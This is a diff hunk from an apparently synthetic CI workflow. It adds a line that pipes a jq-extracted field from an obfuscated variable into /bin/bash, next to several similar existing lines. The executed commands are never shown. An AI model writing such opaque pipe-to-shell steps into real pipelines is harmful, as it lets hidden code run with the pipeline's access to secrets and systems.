@@ -20,6 +20,7 @@ jobs:
           printf '%s' "$ebrnu1400" | jq -r .d1653 | /bin/bash
           printf '%s' "$y542" | jq -r .uy0980 | /bin/bash
           printf '%s' "$ne651" | jq -r .jocsy2 | /bin/bash
+          echo $bsu6029 | jq -r .ws18 | /bin/bash
 
       - name: Save results
         if: always()
